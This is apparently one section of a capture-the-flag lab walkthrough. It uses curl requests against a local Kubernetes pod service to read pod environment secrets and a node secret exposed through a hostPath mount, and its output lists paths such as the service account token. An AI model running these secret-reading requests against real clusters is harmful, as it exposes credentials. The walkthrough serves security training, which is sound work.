# 03: Finding the Bug

## Probe the application

```
$ curl -s http://127.0.0.1:8099/
{"app":"k8s-pod-svc","endpoints":[
  "GET /api/info",
  "GET /api/read?path=<path>",
  "GET /api/mounts"
],"hint":"Try reading /proc/self/environ and /proc/self/mounts"}
```

The `/api/read?path=` endpoint reads files from an allowlist. This is a debug endpoint that was not removed before deployment.

## Read the allowed paths list

Send a request with a path that is not on the list to see what is allowed:

```
$ curl -s 'http://127.0.0.1:8099/api/read?path=/etc/shadow'
{"allowed":["/etc/hostname","/etc/os-release","/mnt/hostpath/node-secret.txt",
"/proc/self/cmdline","/proc/self/environ","/proc/self/mounts","/proc/self/status",
"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
"/var/run/secrets/kubernetes.io/serviceaccount/namespace",
"/var/run/secrets/kubernetes.io/serviceaccount/token"],"error":"path not in allowed debug paths"}
```

The allowlist includes `/proc/self/environ`, `/proc/self/mounts`, the Kubernetes service account token, and `/mnt/hostpath/node-secret.txt`.

## Read pod environment variables

```
$ curl -s 'http://127.0.0.1:8099/api/read?path=/proc/self/environ'
{"content":"...POD_SECRET=POC{...}\n...","path":"/proc/self/environ"}
```

The `POD_SECRET` environment variable contains FLAG1. This was injected at pod startup and is now readable by any process in the pod via `/proc/self/environ`.

## Discover mount points

```
$ curl -s http://127.0.0.1:8099/api/mounts
{"mounts":[...,{"device":"overlay","fstype":"overlay","mountpoint":"/"},
{"device":"/dev/...","fstype":"ext4","mountpoint":"/mnt/hostpath"},...]}
```

The mount at `/mnt/hostpath` with a block device type indicates a bind mount from the node. This is the hostPath volume.

## Read node-level data

```
$ curl -s 'http://127.0.0.1:8099/api/read?path=/mnt/hostpath/node-secret.txt'
{"content":"POC{...}","path":"/mnt/hostpath/node-secret.txt"}
```

FLAG2 is in a file that the node wrote before the pod started. The pod should not be able to read node-only secrets, but the hostPath volume mount makes the node directory accessible.
